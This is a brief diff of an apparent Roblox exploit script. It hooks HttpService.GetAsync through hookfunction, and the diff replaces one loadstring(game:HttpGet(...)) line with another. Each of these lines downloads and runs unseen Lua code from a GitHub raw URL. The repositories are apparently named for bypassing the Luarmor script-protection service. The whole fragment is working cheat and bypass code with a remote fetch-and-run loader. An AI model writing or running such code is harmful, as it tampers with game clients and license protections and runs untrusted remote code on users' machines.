@@ -8,4 +8,4 @@ oldGetAsync = hookfunction(HttpService.GetAsync, function(self, url)
     end
     return oldGetAsync(self, url)
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vxyo/FuckLuarmor/refs/heads/main/trust-lua-lol.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Mc4121ban/skidscript/refs/heads/main/trust-lua-lol.lua.txt"))()
